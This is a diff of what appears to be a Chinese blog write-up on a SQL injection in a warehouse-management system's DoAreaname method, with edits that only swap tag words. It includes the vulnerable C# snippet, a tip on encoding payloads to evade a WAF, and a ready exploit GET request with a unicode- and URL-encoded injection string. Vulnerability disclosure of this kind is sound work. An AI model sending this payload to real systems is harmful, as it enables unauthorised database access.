@@ -30,6 +30,8 @@ asset_dir: embedded-base64
 
 当read=areaname时，进入DoAreaname方法
 
+网络安全
+
 ```
 private string DoAreaname(string strClientValue)
 {
@@ -44,14 +46,6 @@ private string DoAreaname(string strClientValue)
   string strSQL = $"select * from wms_storage_area where 1=1 {str} and ISENABLE=1 order by AREANAME";
   DataSet allSql = tAllDa.GetAllSQL(strSQL);
 ```
-
-深入探索
-
-计算机安全
-
-网络
-
-搜索引擎
 
 strClientValue参数的值被直接拼接在strSQL语句里，然后用GetAllSQL进行执行，全程无过滤或校验，导致[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")。
 
@@ -111,7 +105,7 @@ private string setnotlock()
 
 > 由于参数会被自动去除多余的空格等，同时areaname参数还会进行反转义操作，因此可以对payload进行unicode编码或者16进制编码在url编码等等操作，从而可能绕过waf
 >
-> 计算机安全
+> 数据管理
 
 ```
 GET /WMS_ZX/WmsZXFeeGridSource.aspx?areaname=%20%20%20%20%5c%75%30%30%33%31%5c%75%30%30%32%37%5c%75%30%30%36%31%5c%75%30%30%36%65%5c%75%30%30%36%34%5c%75%30%30%32%30%5c%75%30%30%33%31%5c%75%30%30%33%63%5c%75%30%30%34%30%5c%75%30%30%34%30%5c%75%30%30%35%36%5c%75%30%30%34%35%5c%75%30%30%35%32%5c%75%30%30%35%33%5c%75%30%30%34%39%5c%75%30%30%34%66%5c%75%30%30%34%65%5c%75%30%30%32%64%5c%75%30%30%32%64%20%20%20%20&read=%20%20%20%20areaname%20%20%20%20 HTTP/1.1
